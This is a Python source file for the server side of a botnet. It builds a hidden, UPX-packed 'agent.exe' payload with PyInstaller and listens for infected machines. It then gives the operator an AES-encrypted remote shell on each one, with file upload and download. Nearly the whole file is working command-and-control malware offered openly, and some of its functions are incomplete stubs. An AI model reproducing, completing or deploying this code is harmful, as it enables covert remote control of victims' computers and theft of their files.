import sys, os
import time

from prototype import BotnetInterface, CryptoUtils, Envelope, Peer, socket, timeout, AF_INET, SOCK_STREAM, Config
from prototype import Menu


class Server:
    interface: BotnetInterface
    connections_hash: dict = {}
    online: bool
    config: dict
    cipher: None

    def __init__(self):
        self.interface = BotnetInterface(insocket=socket(AF_INET, SOCK_STREAM))
        self.interface.distribute()
        self.config = self.interface.config
        self.cipher = CryptoUtils.new(self.config.get("settings").get("secret"))

    def bind_listen(self):
        self.interface.bind(('0.0.0.0', self.config.get('incoming').get('port')))
        self.interface.listen(self.config.get('incoming').get('backlog'))

    def accept(self):
        conn, addr = self.interface.accept()
        print('[+] new connection from %s:%s' % addr)
        envelope: Envelope = self.receive(connection=conn)
        peer = Peer(peer_id=envelope.DataText, peer=conn, address=addr, online=True)
        self.connections_hash.setdefault(peer.Id, peer)
        envelope = Envelope(data=True)
        self.interface.send(data=envelope, connection=peer.Socket)
        return True

    def send(self, connection, data):
        self.interface.send(data=data, connection=connection)

    def receive(self, connection):
        return self.interface.receive(connection=connection)

    def compile(self):
        root_path = Config.get_project_root().replace('\\..\\.', '').replace('\\', '\\\\')
        with open(Config.get_agent_spec(), "wb") as spec_in:
            dtypes = b"""# -*- mode: python ; coding: utf-8 -*-\n\n\nblock_cipher = None\n\n\na = Analysis(['agent.py'],\n\t\t\tpathex=['""" + root_path.encode() + b""""'],\n\t\t\tbinaries=[],\n\t\t\tdatas=[("bot.json", ".")],\n\t\t\thiddenimports=[],\n\t\t\thookspath=[],\n\t\t\thooksconfig={},\n\t\t\truntime_hooks=[],\n\t\t\texcludes=[],\n\t\t\twin_no_prefer_redirects=False,\n\t\t\twin_private_assemblies=False,\n\t\t\tcipher=block_cipher,\n\t\t\tnoarchive=False)\npyz = PYZ(a.pure, a.zipped_data,\n\t\t\tcipher=block_cipher)\n\nexe = EXE(pyz,\n\t\t\ta.scripts,\n\t\t\ta.binaries,\n\t\t\ta.zipfiles,\n\t\t\ta.datas,  \n\t\t\t[],\n\t\t\tname='agent',\n\t\t\tdebug=False,\n\t\t\tbootloader_ignore_signals=False,\n\t\t\tstrip=False,\n\t\t\tupx=True,\n\t\t\tupx_exclude=[],\n\t\t\truntime_tmpdir=None,\n\t\t\tconsole=False,\n\t\t\tdisable_windowed_traceback=False,\n\t\t\ttarget_arch=None,\n\t\t\tcodesign_identity=None,\n\t\t\tentitlements_file=None )"""
            spec_in.write(dtypes)
        spec_in.close()
        time.sleep(5)
        spec_path = Config.resource_path("agent.spec")
        print("[CWD]", os.getcwd())
        os.system("pyinstaller --clean " + spec_path)
        print("\n")
        print("=================================================")
        print("=====[   C O M P I L A T I O N   D O N E   ]=====")
        print("=================================================")
        print("\n")
        print("[PAYLOAD] " + Config.resource_path("prototype/dist/agent.exe"))

    def run(self):
        Menu.welcome()
        choice = Menu.startup_section()
        if choice == 0:
            sys.stdout.write("\n[EXIT] bye bye . . .")
            exit(-1)
        if choice == 1:
            print("[INFO] Server is up and running . . .\n")
            payload_type = Menu.payload_section()
            print("[SET] Payload : %s\n" % payload_type)
            payload_path = Config.get_payload(payload_type)
            print("[RM] remove binary path : %s \n" % payload_path)
            print("[RMS] remove binary status : %s " % "wasn't found!" if not Config.remove_dir(payload_path) else "removed!")
            payload_meta_type = "Windows" if payload_type == 1 else "Linux"
            print("[COMPILE][" + payload_meta_type + "] create payload at %s" % payload_path)
            self.compile()
            input("[*] Fresh Payload for '" + payload_meta_type + "' is ready!\n[!] Press [Enter] To Start Server ...")
            self.x()

    def x(self):
        self.bind_listen()
        while True:
            Menu.refresh(self)
            try:
                try:
                    self.interface.incoming.settimeout(60)
                    status = self.accept()
                    if status:
                        _ = input('[ALERT] interact? (Y/n)')
                        if 'y' in _.lower():
                            raise KeyboardInterrupt()
                        else:
                            continue
                except timeout:
                    continue
            except KeyboardInterrupt:
                peer: Peer = Menu.refresh_connections_list(self.connections_hash)
                envelope: Envelope = self.receive(peer.Socket)
                print("[%s] is now %s" % (peer.Id, envelope.DataText))
                while True:
                    envelope = Envelope(data=CryptoUtils.encode_aes(self.cipher, "cd ."))
                    self.send(peer.Socket, envelope)
                    envelope: Envelope = self.receive(peer.Socket)
                    encrypted = envelope.DataText
                    stdout = CryptoUtils.decode_aes(self.cipher, encrypted)
                    if stdout.__contains__(':terminated'):
                        sys.stdout.write(stdout)
                        self.connections_hash.pop(peer.Id)
                        break
                    cwd, out = tuple(stdout.split('\n', 1))
                    sys.stdout.write(out)
                    stdin = input("\n" + cwd)
                    if stdin == 'exit':
                        break
                    if stdin.startswith('download'):
                        remote_file = stdin[9:]
                        status = self.download(rf=remote_file, ps=peer.Socket)
                        sys.stdout.write("download success" if status else "download fail")
                        continue
                    if stdin.startswith("upload"):
                        local_file = stdin[7:]
                        status = self.upload(local_file, peer.Socket)
                        sys.stdout.write("upload success" if status else "upload fail")
                        continue
                    encrypted = CryptoUtils.encode_aes(self.cipher, stdin)
                    envelope = Envelope(data=encrypted)
                    self.send(peer.Socket, envelope)
            Menu.clear_console()
            continue

    def download(self, rf=None, lf=None, ps=None):
        if not rf:
            rf = lf
        self.receive(ps)
        return False

    def upload(self, lf=None, rf=None, ps=None):
        if not lf:
            lf = rf
        f = open(lf, 'rb')
        envelope = Envelope(data=f)
        self.send(connection=ps, data=envelope)

        return False


if __name__ == '__main__':
    s = Server()
    s.run()
